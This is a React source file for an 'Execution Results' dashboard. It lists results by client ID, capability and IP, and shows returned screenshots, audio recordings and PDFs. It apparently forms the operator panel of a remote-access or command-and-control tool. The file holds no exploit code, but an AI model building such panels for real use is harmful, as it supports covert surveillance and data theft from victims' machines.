import React, { useState, useEffect } from 'react';
import { api, CAPABILITIES } from '../api';

function Results() {
  const [results, setResults] = useState([]);
  const [loading, setLoading] = useState(true);
  const [filter, setFilter] = useState('all');
  const [selectedResult, setSelectedResult] = useState(null);

  useEffect(() => {
    fetchResults();
    const interval = setInterval(fetchResults, 3000); // Refresh every 3 seconds
    return () => clearInterval(interval);
  }, []);

  const fetchResults = async () => {
    try {
      const data = await api.getResults(200);
      setResults(data.results || []);
      setLoading(false);
    } catch (error) {
      console.error('Error fetching results:', error);
      setLoading(false);
    }
  };

  const filteredResults = filter === 'all' 
    ? results 
    : results.filter(r => r.capability === parseInt(filter));

  const viewResultDetails = (result) => {
    setSelectedResult(result);
  };

  // Detect if string is base64
  const isBase64 = (str) => {
    if (!str || str.length === 0) return false;
    try {
      // Check if it looks like base64
      return /^[A-Za-z0-9+/]+={0,2}$/.test(str) && str.length % 4 === 0 && str.length > 100;
    } catch (e) {
      return false;
    }
  };

  // Detect data type from base64
  const detectDataType = (base64Str) => {
    if (!base64Str) return null;
    
    // Check for common file signatures (magic numbers)
    const prefix = base64Str.substring(0, 50);
    
    // PNG signature
    if (prefix.startsWith('iVBORw0KGgo')) return 'image/png';
    // JPEG signature
    if (prefix.startsWith('/9j/')) return 'image/jpeg';
    // GIF signature
    if (prefix.startsWith('R0lGOD')) return 'image/gif';
    // BMP signature
    if (prefix.startsWith('Qk0')) return 'image/bmp';
    // WAV signature
    if (prefix.startsWith('UklGR')) return 'audio/wav';
    // MP3 signature (ID3 tag)
    if (prefix.startsWith('SUQz') || prefix.startsWith('//v') || prefix.startsWith('//s')) return 'audio/mpeg';
    // PDF signature
    if (prefix.startsWith('JVBERi0')) return 'application/pdf';
    
    return null;
  };

  // Render base64 data based on type
  const renderBase64Data = (result) => {
    const dataType = detectDataType(result);
    
    if (!dataType) {
      return (
        <div>
          <p><strong>Base64 Data</strong> (Type: Unknown)</p>
          <textarea
            readOnly
            rows="15"
            value={result || 'No result data'}
            style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%' }}
          />
        </div>
      );
    }

    if (dataType.startsWith('image/')) {
      return (
        <div>
          <p><strong>Screenshot/Image</strong></p>
          <img 
            src={`data:${dataType};base64,${result}`} 
            alt="Result" 
            style={{ maxWidth: '100%', border: '1px solid #ddd', borderRadius: '4px' }}
          />
          <details style={{ marginTop: '10px' }}>
            <summary style={{ cursor: 'pointer', color: '#007bff' }}>Show Raw Base64</summary>
            <textarea
              readOnly
              rows="10"
              value={result}
              style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%', marginTop: '10px' }}
            />
          </details>
        </div>
      );
    }

    if (dataType.startsWith('audio/')) {
      return (
        <div>
          <p><strong>Audio Recording</strong></p>
          <audio controls style={{ width: '100%', marginBottom: '10px' }}>
            <source src={`data:${dataType};base64,${result}`} type={dataType} />
            Your browser does not support the audio element.
          </audio>
          <details style={{ marginTop: '10px' }}>
            <summary style={{ cursor: 'pointer', color: '#007bff' }}>Show Raw Base64</summary>
            <textarea
              readOnly
              rows="10"
              value={result}
              style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%', marginTop: '10px' }}
            />
          </details>
        </div>
      );
    }

    if (dataType === 'application/pdf') {
      return (
        <div>
          <p><strong>PDF Document</strong></p>
          <a 
            href={`data:${dataType};base64,${result}`}
            download="document.pdf"
            className="btn"
            style={{ marginBottom: '10px' }}
          >
            Download PDF
          </a>
          <details style={{ marginTop: '10px' }}>
            <summary style={{ cursor: 'pointer', color: '#007bff' }}>Show Raw Base64</summary>
            <textarea
              readOnly
              rows="10"
              value={result}
              style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%', marginTop: '10px' }}
            />
          </details>
        </div>
      );
    }

    return (
      <textarea
        readOnly
        rows="15"
        value={result || 'No result data'}
        style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%' }}
      />
    );
  };

  if (loading) {
    return <div className="loading">Loading results...</div>;
  }

  return (
    <div>
      <div className="card">
        <h2>Execution Results ({results.length})</h2>
        
        <div className="form-group" style={{ maxWidth: '300px', marginBottom: '20px' }}>
          <label htmlFor="filter">Filter by Capability</label>
          <select
            id="filter"
            value={filter}
            onChange={(e) => setFilter(e.target.value)}
          >
            <option value="all">All Capabilities</option>
            {Object.entries(CAPABILITIES)
              .filter(([id]) => id !== '0')
              .map(([id, name]) => (
                <option key={id} value={id}>
                  {name}
                </option>
              ))}
          </select>
        </div>

        {filteredResults.length === 0 ? (
          <p>No results yet.</p>
        ) : (
          <table className="table">
            <thead>
              <tr>
                <th>Timestamp</th>
                <th>Client ID</th>
                <th>Capability</th>
                <th>Result Type</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody>
              {filteredResults.slice().reverse().map((result, idx) => {
                const dataType = isBase64(result.result) ? detectDataType(result.result) : null;
                const resultType = dataType 
                  ? (dataType.startsWith('image/') ? '🖼️ Image' 
                    : dataType.startsWith('audio/') ? '🔊 Audio' 
                    : dataType === 'application/pdf' ? '📄 PDF' 
                    : 'Base64 Data')
                  : 'Text';
                
                return (
                  <tr key={idx}>
                    <td>{new Date(result.timestamp).toLocaleString()}</td>
                    <td><code>{result.client}</code></td>
                    <td>{CAPABILITIES[result.capability] || `Unknown (${result.capability})`}</td>
                    <td>{resultType}</td>
                    <td>
                      <button className="btn" onClick={() => viewResultDetails(result)}>
                        View Full
                      </button>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        )}
      </div>

      {selectedResult && (
        <div className="card">
          <h2>Result Details</h2>
          <button className="btn" style={{ marginBottom: '15px' }} onClick={() => setSelectedResult(null)}>
            Close
          </button>
          
          <div style={{ marginBottom: '15px' }}>
            <strong>Client:</strong> <code>{selectedResult.client}</code><br />
            <strong>Capability:</strong> {CAPABILITIES[selectedResult.capability]}<br />
            <strong>Timestamp:</strong> {new Date(selectedResult.timestamp).toLocaleString()}<br />
            <strong>IP:</strong> {selectedResult.ip}
          </div>

          <div className="form-group">
            <label>Result Data</label>
            {isBase64(selectedResult.result) 
              ? renderBase64Data(selectedResult.result)
              : (
                <textarea
                  readOnly
                  rows="15"
                  value={selectedResult.result || 'No result data'}
                  style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%' }}
                />
              )
            }
          </div>
        </div>
      )}
    </div>
  );
}

export default Results;
